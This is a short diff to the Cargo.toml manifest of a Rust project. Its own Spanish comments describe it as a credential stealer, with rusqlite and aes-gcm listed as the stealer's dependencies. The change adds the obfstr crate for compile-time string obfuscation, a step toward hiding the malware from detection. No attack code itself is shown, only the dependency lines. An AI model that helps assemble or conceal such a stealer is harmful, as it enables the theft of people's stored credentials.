@@ -4,6 +4,9 @@ version = "2.0.0"
 edition = "2021"
 
 [dependencies]
+# Ofuscación de strings en compile-time
+obfstr = "0.4"
+
 # Dependencias para el stealer de credenciales
 rusqlite = { version = "0.31", features = ["bundled"] }
 aes-gcm = "0.10"
